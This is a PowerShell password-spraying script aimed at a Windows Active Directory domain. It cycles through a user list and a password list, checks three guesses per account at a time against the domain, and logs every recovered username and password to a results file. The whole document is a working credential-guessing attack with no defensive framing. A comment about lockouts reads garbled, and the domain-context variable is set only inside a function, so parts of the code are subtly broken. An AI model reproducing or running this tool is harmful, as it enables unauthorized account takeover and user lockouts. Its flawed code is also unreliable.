$UserDomain = $env:USERDOMAIN

function Initialize-Domain {
    Write-Host "[*] Inititalizing domain..."
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement 
    $ContextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
    $PrincipalContext = [System.DirectoryServices.AccountManagement.PrincipalContext]::new($ContextType, $UserDomain)
}

$UserFile = "users.txt"
$PassFile = "passwords.txt"
$LogFile = "results.txt"
$UserCounter = 0
$Splitter = "-" * 50
$PassWordCount = (Get-Content $PassFile).Count
$UserTable = @{}

foreach($User in Get-Content $UserFile) {
    # Creating hashtables with all users to store information.
    $UserCounter++
    $UserTable.$User = @()
    $UserTable.$User += 0
    $UserTable.$User += ""
}

Write-Host $Splitter

$LastPassValue = $UserTable.Values | Select -Last 1

Write-Host "[!] Starting brute force..."
Initialize-Domain
Write-Host $Splitter
Start-Sleep -Seconds 5

While($LastPassValue -lt $PassWordCount){
    # The script checks 3 passwords at the same time in order to lock out any users.
    # This while loop ensures that all passwords in the list are checked.
    :UserLoop foreach ($User in $UserTable.GetEnumerator() | sort -Property name ) {
        # The loop runs for each user in the hashtable.

        if($UserTable[$User.Name][1] -ne 1){
            # The if statement checks if the password of the user has already been found.

            Start-Sleep -Seconds 0.5
            $CurrentPassCount = $User.Value[0]
            $CurrentUser = $User.Name

            1..3 | % {
                # Checks a range of three passwords.
                $CurrentPassword = Get-Content $PassFile | Select -Index $CurrentPasscount
                Write-Host "[*] Checking $CurrentUser with password: $CurrentPassword"
                $CurrentPassCount = $CurrentPassCount + 1

                $success = $principalContext.ValidateCredentials($CurrentUser, $CurrentPassword)
                if ($success -eq $True)
                {
                    # If the user is successfully authenticated, this section is called.
                    # Here the information is written to a results file, and a found password tag is added to the user.

                    $UserInfo = "User: $CurrentUser, Password: $CurrentPassword"
                    $UserTable[$User.Name][1] = 1
                    Write-Output "[!] Password found: $UserInfo..."
                    $UserInfo | Add-Content $LogFile
                    Initialize-Domain
                    Start-Sleep -Seconds 5 
                }
            }
            $UserTable[$User.Name][0] = $CurrentPassCount
        }
        else{
            Write-Host "[*] Password already found for user: $User.Name..."
        }
    }
}
